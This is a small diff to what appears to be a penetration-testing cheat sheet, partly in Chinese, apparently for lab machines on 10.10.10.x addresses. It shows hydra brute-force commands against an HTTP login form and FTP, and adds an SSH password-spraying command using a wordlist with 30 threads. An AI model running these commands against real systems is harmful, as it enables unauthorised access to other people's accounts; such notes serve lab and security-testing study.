@@ -23,3 +23,9 @@ sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-pos
 ```
 sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.35 -f
 ```
+
+- ssh 密码喷射
+
+```
+hydra -l sword -P passwords.txt ssh://10.10.10.5 -t 30 -V
+```
